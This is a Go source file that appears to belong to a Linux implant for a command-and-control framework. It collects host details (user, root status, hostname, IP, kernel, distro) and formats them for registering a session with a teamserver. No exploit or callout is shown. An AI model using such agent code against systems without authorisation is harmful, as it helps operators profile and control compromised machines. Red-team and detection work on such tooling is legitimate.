package main

import (
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// HostInfo is everything the agent needs to describe itself at registration
// time. It intentionally mirrors the fields encoded by the Windows beacon so
// that the teamserver UI renders Linux sessions identically.
type HostInfo struct {
	Pid         int
	Tid         int
	Arch        string
	Arch64      bool
	Elevated    bool
	InternalIP  net.IP
	GmtOffset   int
	Hostname    string
	Username    string
	ProcessName string
	Domain      string

	OsRelease   string // PRETTY_NAME from /etc/os-release
	Kernel      string // uname -r
	KernelMajor int
	KernelMinor int
	KernelPatch int
	Machine     string
}

func collectHostInfo() *HostInfo {
	hi := &HostInfo{
		Pid:      os.Getpid(),
		Tid:      syscall.Gettid(),
		Arch:     runtime.GOARCH,
		Arch64:   strconv.IntSize == 64,
		Elevated: os.Geteuid() == 0,
		Domain:   "",
	}

	if host, err := os.Hostname(); err == nil {
		hi.Hostname = host
	} else {
		hi.Hostname = "localhost"
	}

	hi.Username = userNameByUID(os.Getuid())
	if v := os.Getenv("USER"); hi.Username == "" && v != "" {
		hi.Username = v
	}

	// Prefer the canonical image name: /proc/self/comm is limited to 15 bytes
	// by the kernel (TASK_COMM_LEN), which truncates realistic binary names.
	if exe, err := os.Readlink("/proc/self/exe"); err == nil && exe != "" {
		hi.ProcessName = filepath.Base(exe)
	}
	if hi.ProcessName == "" {
		hi.ProcessName = readTrim("/proc/self/comm")
	}
	if hi.ProcessName == "" {
		if len(os.Args) > 0 {
			hi.ProcessName = filepath.Base(os.Args[0])
		} else {
			hi.ProcessName = "jinxed"
		}
	}

	hi.InternalIP = primaryIPv4()

	_, offset := time.Now().Zone()
	hi.GmtOffset = offset / 3600

	hi.Kernel = readTrim("/proc/sys/kernel/osrelease")
	if hi.Kernel == "" {
		hi.Kernel = "unknown"
	}
	hi.KernelMajor, hi.KernelMinor, hi.KernelPatch = parseKernelVersion(hi.Kernel)

	hi.OsRelease = distroPrettyName()
	hi.Machine = unameMachine(runtime.GOARCH)

	return hi
}

func parseKernelVersion(release string) (int, int, int) {
	base := release
	if i := strings.IndexAny(base, "-+"); i >= 0 {
		base = base[:i]
	}
	parts := strings.Split(base, ".")
	major, minor, patch := 0, 0, 0
	if len(parts) > 0 {
		major, _ = strconv.Atoi(parts[0])
	}
	if len(parts) > 1 {
		minor, _ = strconv.Atoi(parts[1])
	}
	if len(parts) > 2 {
		patch, _ = strconv.Atoi(parts[2])
	}
	return major, minor, patch
}

func readTrim(path string) string {
	b, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(b))
}

func distroPrettyName() string {
	b, err := os.ReadFile("/etc/os-release")
	if err != nil {
		b, err = os.ReadFile("/usr/lib/os-release")
		if err != nil {
			return "Linux"
		}
	}
	for _, line := range strings.Split(string(b), "\n") {
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			v := strings.TrimPrefix(line, "PRETTY_NAME=")
			v = strings.Trim(v, "\"")
			if v != "" {
				return v
			}
		}
	}
	return "Linux"
}

func unameMachine(goarch string) string {
	switch goarch {
	case "amd64":
		return "x86_64"
	case "386":
		return "i686"
	case "arm64":
		return "aarch64"
	case "arm":
		return "armv7l"
	case "mips64":
		return "mips64"
	case "ppc64le":
		return "ppc64le"
	case "riscv64":
		return "riscv64"
	case "s390x":
		return "s390x"
	default:
		return goarch
	}
}

// primaryIPv4 returns the first non-loopback IPv4 address of an interface that
// is up, or 127.0.0.1 when the host only has loopback connectivity.
func primaryIPv4() net.IP {
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, a := range addrs {
				var ip net.IP
				switch v := a.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() {
					continue
				}
				if ip4 := ip.To4(); ip4 != nil {
					return ip4
				}
			}
		}
	}
	return net.IPv4(127, 0, 0, 1)
}

// ipToLong reproduces the little-endian packing of in_addr.S_un.S_addr that
// the teamserver's int32ToIPv4() helper expects.
func ipToLong(ip net.IP) uint32 {
	ip4 := ip.To4()
	if ip4 == nil {
		return 0
	}
	return uint32(ip4[0]) | uint32(ip4[1])<<8 | uint32(ip4[2])<<16 | uint32(ip4[3])<<24
}

// internalIPString renders the session address the way the Adaptix client shows
// it.
func (a *agent) internalIPString() string {
	ip := a.info.InternalIP
	if ip == nil {
		return "127.0.0.1"
	}
	return ip.String()
}
